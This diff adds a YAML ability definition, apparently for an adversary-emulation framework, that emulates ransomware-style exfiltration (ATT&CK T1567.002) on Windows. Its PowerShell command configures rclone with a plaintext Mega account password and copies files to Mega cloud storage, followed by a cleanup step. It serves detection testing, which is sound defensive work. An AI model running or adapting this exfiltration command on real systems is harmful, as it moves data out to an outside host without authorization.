@@ -1,0 +1,32 @@
+---
+- id: 9995c62a6263a14ae3b60fe2bb52e67a
+  name: Exfiltrate data with rclone to cloud Storage - Mega (Windows)
+  description: 'This test uses rclone to exfiltrate data to a remote cloud storage
+    instance. (Mega)
+
+    See https://thedfirreport.com/2022/06/16/sans-ransomware-summit-2022-can-you-detect-this/
+
+    '
+  tactic: exfiltration
+  technique:
+    attack_id: T1567.002
+    name: 'Exfiltration Over Web Service: Exfiltration to Cloud Storage'
+  platforms:
+    windows:
+      psh:
+        command: New-Item $env:appdata\rclone -ItemType directory; New-Item $env:appdata\rclone\rclone.conf;
+          cd "PathToAtomicsFolder\..\ExternalPayloads\T1567.002\rclone-v*\"; .\rclone.exe
+          config create T1567002 mega; set-Content $env:appdata\rclone\rclone.conf
+          "[T1567002] `n type = mega `n user = atomictesting@outlook.com `n pass =
+          vmcjt1A_LEMKEXXy0CKFoiFCEztpFLcZVNinHA"; .\rclone.exe copy --max-size 1700k
+          "PathToAtomicsFolder\..\ExternalPayloads\T1567.002" T1567002:test -v
+        payloads: []
+        cleanup: cd "PathToAtomicsFolder\..\ExternalPayloads\T1567.002\rclone-v*\";
+          .\rclone.exe purge T1567002:test; .\rclone.exe config delete T1567002:;
+          Remove-Item $env:appdata\rclone -recurse -force -erroraction silentlycontinue;
+          cd c:\; Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\rclone.zip";
+          Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\T1567.002" -recurse
+          -force
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
